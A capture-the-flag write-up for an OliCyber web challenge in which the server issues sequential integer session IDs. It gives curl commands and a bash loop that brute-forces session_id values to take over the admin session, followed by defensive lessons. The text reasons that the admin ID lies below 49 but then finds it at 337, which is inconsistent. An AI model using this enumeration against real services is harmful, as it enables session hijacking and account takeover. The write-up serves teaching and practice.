# A too small reminder

**Competition:** OliCyber<br>
**Category:** Web / API<br>
**URL:** http://too-small-reminder.challs.olicyber.it

---

## Description

> This API doesn't seem to do anything useful... Discover the admin's secrets!

An API with a vulnerable session system. The objective is to access the `/admin` endpoint as a privileged user.

---

## Solution

### Step 1 — Initial Reconnaissance

When accessing the site with a simple GET request, we find automatic documentation of available endpoints:

```json
{
  "Endpoints": [
    { "path": "/",        "description": "Accepts GET requests. Returns this small API description." },
    { "path": "/register","description": "Accepts POST requests with 'username' and 'password'. Creates a new account." },
    { "path": "/login",   "description": "Accepts POST requests with 'username' and 'password'. Returns a session cookie." },
    { "path": "/logout",  "description": "Accepts GET requests with a valid session cookie. Destroys the session." },
    { "path": "/admin",   "description": "Accepts GET requests with a valid session cookie." }
  ]
}
```

---

### Step 2 — Registration and Login

We register an account and log in to examine the assigned session cookie:

```bash
# Registration
curl -s -X POST http://too-small-reminder.challs.olicyber.it/register \
  -H "Content-Type: application/json" \
  -d '{"username": "ciao", "password": "ciao123"}'
```

Response:
```json
{"messaggio": "Registrazione avvenuta con successo"}
```

We log in:

```bash
curl -s -X POST http://too-small-reminder.challs.olicyber.it/login \
  -H "Content-Type: application/json" \
  -d '{"username": "ciao", "password": "ciao123"}' \
  -c cookies.txt -v
```

We immediately notice something unusual in the `Set-Cookie` header:

```
Set-Cookie: session_id=50; Path=/
```

```json
{"messaggio": "Login effettuato con successo. È stato assegnato un id di sessione correttamente."}
```

---

### Step 3 — Vulnerability Identification

The session cookie is not a JWT, a hash or a complex token: it's simply a **sequential integer**.

```
session_id=50
```

This is exactly what the title means: the session ID is a small, predictable, and non-random number. The server assigns IDs sequentially, which means that:

- The admin logged in at an earlier time
- His `session_id` is a number between `1` and `49`
- We can **impersonate** the admin simply by guessing his ID

This vulnerability is known as **Insecure Direct Object Reference (IDOR)** applied to session cookies.

---

### Step 4 — Session ID Brute Force

We launch a loop over all IDs in the range 1 to our ID, filtering anomalous responses:

```bash
for i in $(seq 1 1000); do
  response=$(curl -s http://too-small-reminder.challs.olicyber.it/admin \
    -H "Cookie: session_id=$i")
  echo "session_id=$i -> $response"
done
```

---

### Step 5 — Result

At `session_id=337` the server responds differently from all others:

```json
{"messaggio":"Bentornato admin! flag{...}"}
```

**Flag:** `flag{...}`

---

## Conclusions

The vulnerability exploited is a **predictable and sequential Session ID**. The server assigned session IDs as simple sequential integers, making it trivial to impersonate any user, including the admin, simply by iterating through possible values.

### Lessons Learned

- **Session IDs must be random and unpredictable**, generated with a CSPRNG (Cryptographically Secure Pseudo-Random Number Generator)
- A secure session ID must have **at least 128 bits of entropy**
- Never use counters, timestamps, or other predictable values as session identifiers
- This type of attack falls under the **IDOR (Insecure Direct Object Reference)** category, classified in the [OWASP Top 10](https://owasp.org/Top10/) under *Broken Access Control*